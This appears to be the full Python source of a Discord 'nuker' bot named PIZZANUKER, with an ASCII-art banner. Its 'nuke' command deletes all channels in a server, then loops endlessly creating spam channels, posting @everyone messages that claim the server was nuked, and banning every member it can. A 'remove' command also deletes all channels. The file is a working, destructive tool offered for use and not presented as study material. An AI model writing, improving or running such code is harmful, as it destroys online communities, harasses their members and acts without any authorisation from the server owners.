token = "Put your bot token here!"
import discord
from discord.ext import commands
from discord.flags import Intents
from discord.utils import get
import time
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="p", case_insensitive=True, help_command=None, intents=intents)
@bot.event
async def on_ready():
    print("""                                               ==++==+++**++                                       
                                               +***++***+-:::-:::                                   
                                             -+*+***+++*##**+++=-:::                                
                                            =+**+++++++*##**+++===-:::::                            
                                          ==++*+==--=+==+*+++=+*++=--::::::                         
                                        ==+++++++++==-:-==+++++=**+=++++-:::::                      
                                      =-==+++++++++-.::------:-=**#****+++=-:::.                    
                                    --==++++++++==-.....::-----=****+++++++=---:::                  
                                   --=++++=+++=+==.............-++====+++**+==-:::::::              
                                 :-==+++++++++=---...............--::-==++++==--::::::::            
                                 -=++++====-:.::::-..-==-----:::::.....:-=++++*+=-::::::::          
                                --==-:::....::--==++++++++++++++=-:.....:-==+*#*++---:::::::        
                               ::--+=-:..::::-===+++++++++++++++*+=-......:-+***+==++=:::::::       
                             ----===-::::..:---==+++++++++++*+++++++=--:...:-===+=====--:::::::     
                          --=============-:.:--=+++***+****+****++++=:::...::-=+*+*+++=-:::::::::   
                         -====--===+=====+====--=+++***+++***+++++++-.......:-+**+**+**+===-..::-:- 
                      --=++=+=++++++++*+++++++++-:-=++++++++****+=-:..:----===+++**#****+++=::::----
                        :--++++++++++++++++++*++-...:-====++++=-::...-====+++**++*###*****=-:::--:::
                      :::-=+**+++++**++++++***++-::--------:::::=-::-====++**++=****++++*+=---::::: 
                      ::--=+++*++++**+**++++++++=====-==-===+=-:.-======++++++++++++*++=+===-----   
                     -:::::-=++*+***++*++**+++======+*+++++*+++=-.:-=====++===++=+**+==-=--:::      
                 -===+=:..:::::===+++++++*+=--===+++++***=++==++=--====--==-====-==-:---:::         
               -=++=++===-::......:::::::....-==-=++*+++=+++++++-=-=+======-=+==-------:            
            ===+++++*+=+=----::-=+++++++==-:.-====+=+==++=++++++===::==-:...::::--                  
          ===+++++++++++++--:-==**++=++==+***==-=+*++*++=====-==-::::-:.....::                      
        ===+++*+*++++=+==-::=++=+++=+++===+***+=--***++*+==----=+****+=-:                           
       ==+****+*+++++=:...:===-=+*++*+==+*=+****======+-:::=+=---::                                 
     -=++*****+++++=-::.:.:===-++****++********+-=-:..::::::                                        
     :-=+*+++===-:::...:::-+*++*********+++++*+++===---                                             
    ::::::::::---:-:::--=--+++***+***++++=====-=                                                    
  -:---:::::.::-------=++***++++++++=--                                                             
 --:--::::--::::--=====--==---:                                                                     
  =-::::--+++=-----                                                                                 
  :-=++===--::                                                                                     """)
   

@bot.command()
async def nuke(ctx):
    allow_mentions = discord.AllowedMentions(everyone = True)
    guild = ctx.message.guild
    m = ctx.guild.members
    for c in ctx.guild.channels:
        await c.delete()
    time.sleep(4)
    while True:
        channels = await guild.create_text_channel("GET NUKED BY FUNKYSEALS")
        vchannels = await guild.create_voice_channel("L + NUKED")
        await vchannels.send(content = "@everyone YOUR SERVER GOT NUKED BY FUNKYSEALS (PIZZANUKER)")
        await channels.send(content = "@everyone YOUR SERVER GOT NUKED BY FUNKYSEALS (PIZZANUKER)")
        for user in ctx.guild.members:
            try:
                await user.ban()
            except:
                pass
        
            
    
@bot.command()
async def remove(ctx):
    for c in ctx.guild.channels:
        await c.delete()

@bot.command()
async def m(ctx):
    print(ctx.guild.members)
        
bot.run(token)
